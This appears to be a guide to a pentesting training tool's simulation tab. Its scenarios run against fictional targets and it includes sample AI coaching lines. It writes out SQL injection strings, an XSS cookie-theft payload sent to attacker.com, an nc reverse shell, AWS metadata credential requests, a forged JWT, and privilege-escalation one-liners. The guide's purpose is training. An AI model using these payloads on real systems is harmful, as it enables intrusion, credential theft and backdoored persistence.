# Real-World Pentesting Simulations - Complete Guide

## Overview
The new **🎯 Simulations** tab provides realistic, scenario-based pentesting practice with real-time AI coaching. Each scenario simulates actual vulnerabilities and teaches proper exploitation techniques.

## Key Features

### 1. **Real-World Scenarios**
Each scenario mirrors actual pentesting engagements with realistic vulnerabilities, responses, and progression paths.

### 2. **AI Coaching System**
- Real-time feedback on your methodology
- Intelligent suggestions for next steps
- Security best practices guidance
- Technique effectiveness analysis

### 3. **Realistic Command Responses**
- Authentic server responses (HTTP headers, database errors, system output)
- Proper error messages and edge cases
- Realistic service behavior
- Time-based progression

### 4. **Learning Integration**
- Knowledge shared with main AI chat
- Sessions tracked and analyzed
- Personalized recommendations
- Improvement suggestions

---

## Available Scenarios

### Easy Difficulty

#### 🔓 E-Commerce Login Bypass
**Objective**: Bypass login authentication via SQL injection
**Target**: http://shop.vuln.local
**Key Concepts**:
- SQL injection identification
- Authentication bypass techniques
- Database enumeration
- User credential extraction

**Example Commands**:
```bash
# Reconnaissance
curl http://shop.vuln.local/login.php

# SQL Injection Testing
sqlmap -u "http://shop.vuln.local/login.php" --forms

# Manual exploitation
' OR '1'='1
admin'--
' UNION SELECT username, password FROM users--
```

---

#### 🕸️ Reflected XSS in Search
**Objective**: Inject JavaScript to steal session cookies
**Target**: http://blog.vuln.local
**Key Concepts**:
- XSS vulnerability detection
- Payload crafting
- Cookie theft techniques
- CSP bypass (advanced)

**Example Commands**:
```bash
# Reconnaissance
curl "http://blog.vuln.local/search.php?q=test"

# XSS Testing
<script>alert('xss')</script>
<img src=x onerror="fetch('http://attacker.com/cookie?c='+document.cookie)">
```

---

### Medium Difficulty

#### 💉 Admin Panel RCE
**Objective**: Upload malicious file and execute code
**Target**: http://admin.vuln.local
**Key Concepts**:
- File upload vulnerability
- PHP shell execution
- Remote code execution (RCE)
- Reverse shell creation

**Example Commands**:
```bash
# File upload
curl -F "file=@shell.php" http://admin.vuln.local/upload.php

# Command execution
id
cat /etc/passwd
whoami
nc -e /bin/bash attacker.com 4444
```

---

#### 🎭 AWS Metadata SSRF
**Objective**: Extract AWS credentials via SSRF
**Target**: http://app.vuln.local/proxy
**Key Concepts**:
- SSRF vulnerability exploitation
- Metadata service access
- AWS credential extraction
- Privilege escalation with credentials

**Example Commands**:
```bash
# SSRF Discovery
curl http://app.vuln.local/proxy?url=http://localhost:8080

# AWS Metadata Access
curl http://app.vuln.local/proxy?url=http://169.254.169.254/latest/meta-data/

# Extract IAM credentials
curl http://app.vuln.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

#### 🔐 JWT Authentication Bypass
**Objective**: Forge authentication tokens
**Target**: http://api.vuln.local
**Key Concepts**:
- JWT token structure
- Algorithm confusion attacks
- Signature bypass
- Token forgery

**Example Commands**:
```bash
# Token Analysis
# Intercepted token: eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiZ3Vlc3QifQ.

# Decode (base64)
echo "eyJ1c2VyIjoiZ3Vlc3QifQ" | base64 -d

# Forge admin token with "alg":"none"
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ==
```

---

### Hard Difficulty

#### 🏗️ Multi-Vulnerability Application
**Objective**: Chain multiple vulnerabilities for maximum impact
**Target**: http://vulnerable-app.local
**Key Concepts**:
- Multi-vulnerability detection
- Exploit chaining
- Data exfiltration
- RCE achievement

**Example Chains**:
```
1. SQL Injection → Extract database → Get admin credentials
2. XSS → Steal admin session → Gain admin access
3. CSRF + File Upload → RCE → System compromise
```

---

#### 📡 Network Pivoting
**Objective**: Compromise multiple systems through lateral movement
**Target**: Internal network 192.168.1.0/24
**Key Concepts**:
- Network reconnaissance
- Target prioritization
- Lateral movement techniques
- Privilege escalation chaining

**Example Steps**:
```bash
1. Enumerate initial system
   nmap -sV 192.168.1.0/24

2. Identify high-value targets
   - Database server (3306 open)
   - File server (445 writable)

3. Compromise targets
   psexec / impacket exploits

4. Establish persistence
   Add admin accounts, install backdoors
```

---

#### 👤 Linux Privilege Escalation
**Objective**: Escalate from www-data to root
**Target**: Compromised Linux web server
**Key Concepts**:
- SUID binary exploitation
- Sudo misconfiguration
- Kernel vulnerabilities
- Capability exploitation

**Example Techniques**:
```bash
# Enumeration
sudo -l                  # Check sudo permissions
find / -perm -4000     # Find SUID binaries
getcap -r /             # Find capability escalation

# Exploitation
# SUID binary: find
find / -exec /bin/sh -p \; -quit

# Sudo misconfiguration
sudo /usr/bin/python3 -c "import os; os.system('/bin/bash')"
```

---

## How to Use

### 1. **Select a Scenario**
- Click on a scenario from the list
- Read the briefing and objectives
- Understand the target environment

### 2. **Execute Commands**
- Type real pentesting commands
- System simulates realistic responses
- See authentic error messages and output

### 3. **Monitor AI Feedback**
- Real-time coaching appears in the AI section
- Guidance on methodology effectiveness
- Suggestions for next steps
- Security best practices reminders

### 4. **Progress Through Objectives**
- Each successful step advances you
- AI adapts coaching based on progress
- Learn from mistakes with constructive feedback

### 5. **Complete and Review**
- Document all findings
- Review what worked and why
- Understand defensive countermeasures
- Apply learning to real assessments

---

## Command Examples by Category

### Reconnaissance
```bash
curl http://target
nmap -sV target
whatweb target
nuclei -u http://target
```

### SQL Injection
```bash
sqlmap -u "http://target/page?id=1"
' OR '1'='1
' UNION SELECT table_name FROM information_schema.tables--
admin'--
```

### XSS Testing
```bash
<script>alert('xss')</script>
<img src=x onerror="alert('xss')">
<svg onload="alert('xss')">
javascript:alert('xss')
```

### Command Injection
```bash
; id
| whoami
` whoami `
$(whoami)
```

### SSRF
```bash
http://localhost:8080
http://127.0.0.1:80
http://169.254.169.254
file:///etc/passwd
```

---

## AI Coaching Examples

### When you start exploring
> "Good reconnaissance! Web application testing is essential. Next, try to identify SQL injection vulnerabilities in the login form."

### When you find a vulnerability
> "Excellent! You've identified the XSS vulnerability. Now craft a payload to steal session cookies using fetch() with the captured cookie."

### When you're on the right track
> "Perfect approach! You've successfully exploited the SQL injection. Now extract the user database and look for admin credentials."

### When you complete an objective
> "Excellent work! You've achieved RCE. Now establish a reverse shell for persistent access and escalate privileges."

---

## Learning Progression

### Beginner Path
1. Start with **E-Commerce Login Bypass** (Easy)
   - Learn SQL injection basics
   - Understand authentication mechanisms
   
2. Move to **Reflected XSS** (Easy)
   - Learn JavaScript injection
   - Understand cookie theft

### Intermediate Path
3. Try **Admin Panel RCE** (Medium)
   - Combine file upload + code execution
   - Learn command execution
   
4. Attempt **AWS Metadata SSRF** (Medium)
   - Learn service enumeration
   - Understand credential extraction

5. Practice **JWT Bypass** (Medium)
   - Cryptography vulnerability concepts
   - Token manipulation techniques

### Advanced Path
6. Challenge **Multi-Vulnerability App** (Hard)
   - Chain multiple exploits
   - Complex attack scenarios
   
7. Master **Network Pivoting** (Hard)
   - Lateral movement
   - Post-exploitation techniques
   
8. Complete **Privilege Escalation** (Hard)
   - System hardening knowledge
   - Advanced exploitation techniques

---

## Tips for Success

### ✅ Best Practices
1. **Start with reconnaissance** - Understand the target before exploiting
2. **Test systematically** - Try multiple payloads and techniques
3. **Read error messages** - They often reveal important information
4. **Document findings** - Keep notes of what works and why
5. **Understand defensive measures** - Learn how to prevent these vulnerabilities

### ⚠️ Common Mistakes to Avoid
1. Skipping reconnaissance phase
2. Using generic payloads without customization
3. Not reading AI feedback and suggestions
4. Giving up too quickly
5. Not understanding why an exploit works

### 🎯 Optimization Tips
1. Pay attention to AI coaching suggestions
2. Build on successful techniques
3. Experiment with variations
4. Learn from failed attempts
5. Review completed scenarios later

---

## Integration with Main AI Chat

The Simulations tab shares knowledge with your main HadesAI chat:
- Commands executed appear as context
- Findings are logged and analyzed
- AI provides related security knowledge
- Techniques learned inform future assessments
- Sessions are tracked for progress monitoring

### Example Chat Integration:
```
USER: I'm practicing SQL injection in the Simulations tab
AI: Great! SQL injection (CWE-89) is one of the OWASP Top 10. 
    While you practice, remember:
    - Input validation is critical
    - Parameterized queries prevent SQLi
    - WAF bypass techniques exist for real targets
```

---

## Real-World Application

These simulations prepare you for actual pentesting:
- **Technique transferability**: Skills directly apply to real assessments
- **Tool usage**: Learn actual pentesting tools (sqlmap, curl, nmap, etc.)
- **Methodology**: Follow OWASP testing guide structure
- **Documentation**: Practice proper finding documentation
- **Decision making**: Learn which techniques work best when

---

## Version History

**Version 1.1** - Real-World Focused
- Enhanced scenario realism
- AI coaching integration
- Dynamic response generation
- Command-based interaction
- Learning progression paths

**Version 1.0** - Initial Release
- Basic scenario framework
- Pattern-matching responses
- Static hints system

---

## Support & Feedback

Found an issue or have improvement suggestions?
- The simulations will improve as you use them
- AI learns from your approaches
- Feedback helps refine scenarios
- Community techniques enrich the database

---

## Security Note

These simulations use realistic payloads and techniques **for educational purposes only**. All attacks are simulated against fictional systems. Never use these techniques against real systems without explicit authorization from the system owner.

**Happy Learning! 🚀**
